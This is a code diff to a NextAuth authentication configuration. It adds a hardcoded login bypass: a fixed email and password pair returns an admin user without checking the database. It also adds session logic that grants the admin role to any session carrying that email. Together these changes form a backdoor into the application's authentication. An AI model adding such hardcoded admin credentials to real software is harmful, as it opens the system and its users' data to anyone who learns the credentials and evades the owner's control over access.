@@ -23,6 +23,17 @@ export const authOptions: NextAuthOptions = {
                     throw new Error("Invalid credentials");
                 }
 
+                // Bypass Login
+                if (credentials.email.toLowerCase() === "ops@encore.com" && credentials.password === "encore@2026") {
+                    return {
+                        id: "bypass-id",
+                        name: "Bypass User",
+                        email: "ops@encore.com",
+                        role: "admin",
+                        emailVerified: new Date()
+                    };
+                }
+
                 const user = await prisma.user.findUnique({
                     where: { email: credentials.email.toLowerCase() }
                 });
@@ -58,6 +69,13 @@ export const authOptions: NextAuthOptions = {
         async session({ session }) {
             // Add user ID to session from database
             if (session.user?.email) {
+                // Bypass Logic for Session
+                if (session.user.email === "ops@encore.com") {
+                    session.user.id = "bypass-id";
+                    session.user.role = "admin";
+                    return session;
+                }
+
                 const dbUser = await prisma.user.findUnique({
                     where: { email: session.user.email },
                 });
